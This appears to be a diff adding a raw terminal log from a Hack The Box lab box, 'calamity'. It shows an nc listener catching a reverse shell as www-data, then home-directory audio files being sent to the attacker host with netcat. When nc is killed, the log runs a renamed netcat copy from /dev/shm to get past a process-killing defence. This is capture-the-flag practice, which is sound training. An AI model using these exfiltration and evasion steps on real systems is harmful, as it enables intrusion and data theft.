@@ -1,0 +1,82 @@
+root@parrot:~/hackthebox/calamity# nc -nvlp 9001                                
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::9001              
+Ncat: Listening on 0.0.0.0:9001         
+Ncat: Connection from 10.10.10.27.      
+Ncat: Connection from 10.10.10.27:33034.                                        
+Linux calamity 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 athlon i686 GNU/Linux                                                         
+ 03:19:45 up 42 min,  0 users,  load average: 0.00, 0.00, 0.00                  
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT             
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                           
+/bin/sh: 0: can't access tty; job control turned off                            
+$ cd /home/                             
+$ ls                                    
+xalvas                                  
+$ cd xalvas                             
+$ ls                                    
+alarmclocks                             
+app                                     
+dontforget.txt                          
+intrusions                              
+peda                                    
+recov.wav                               
+user.txt                                
+$ cd alarmclocks                        
+$ ls                                    
+rick.wav                                
+xouzouris.mp3                           
+$ nc 10.10.14.14 999 < rick.wav         
+$ ls                                    
+rick.wav                                
+xouzouris.mp3                           
+$ md5sum rick.wav                       
+a69077504fc70a0bd5a0e9ed4982a6b7  rick.wav                                      
+$ nc 10.10.14.14 999 < rick.wav         
+Killed                                  
+$ /dev/shm/ipp 10.10.14.14 999 < rick.wav                                       
+/bin/sh: 11: /dev/shm/ipp: not found    
+$ /dev/shm/arr 10.10.14.14 999 < rick.wav                                       
+^C                                      
+root@parrot:~/hackthebox/calamity# nc -nvlp 9001                                
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::9001              
+Ncat: Listening on 0.0.0.0:9001         
+Ncat: Connection from 10.10.10.27.      
+Ncat: Connection from 10.10.10.27:33042.                                        
+Linux calamity 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 athlon i686 GNU/Linux                                                         
+ 03:30:13 up 52 min,  0 users,  load average: 0.00, 0.00, 0.00                  
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT             
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                           
+/bin/sh: 0: can't access tty; job control turned off                            
+$ cd /home/xalvas/                      
+$ ls                                    
+alarmclocks                             
+app                                     
+dontforget.txt                          
+intrusions                              
+peda                                    
+recov.wav                               
+user.txt                                
+$ cd alarmclocks                        
+$ ls                                    
+rick.wav                                
+xouzouris.mp3                           
+$ ls -la /dev/shm/                      
+total 64                                
+drwxrwxrwt  2 root     root        80 Jan 15 03:26 .                            
+drwxr-xr-x 18 root     root      3880 Jan 15 02:37 ..                           
+-rwxr-xr-x  1 www-data www-data 30320 Jan 15 03:26 arr                          
+-rwxr-xr-x  1 www-data www-data 30320 Jan 15 03:26 nc                           
+$ /dev/shm/arr 10.10.14.14 9999 < rick.wav                                      
+$ /dev/shm/arr 10.10.14.14 9999 < xouzouris.mp3                                 
+$ cd ..                                 
+$ ls                
+alarmclocks         
+app                 
+dontforget.txt      
+intrusions          
+peda                
+recov.wav           
+user.txt            
+$ /dev/shm/arr 10.10.14.14 9999 < recov.wav                                     
+$                   
